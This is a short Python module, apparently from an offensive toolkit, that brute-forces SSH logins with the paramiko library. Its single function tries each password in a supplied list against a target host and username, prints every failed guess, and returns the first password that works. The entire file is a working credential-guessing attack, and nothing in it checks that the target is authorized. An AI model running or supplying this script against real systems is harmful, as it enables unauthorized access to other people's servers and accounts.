import paramiko

def run(target, username, password_list):
    """Attempts SSH login using a list of passwords."""
    print(f"[*] Starting SSH Brute Force on {target} for user: {username}")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        password = password.strip()
        try:
            ssh.connect(target, username=username, password=password, timeout=2)
            print(f"\a[!] SUCCESS: Password found: {password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
            break
            
    print("[-] Brute force finished. No matches found.")
    return None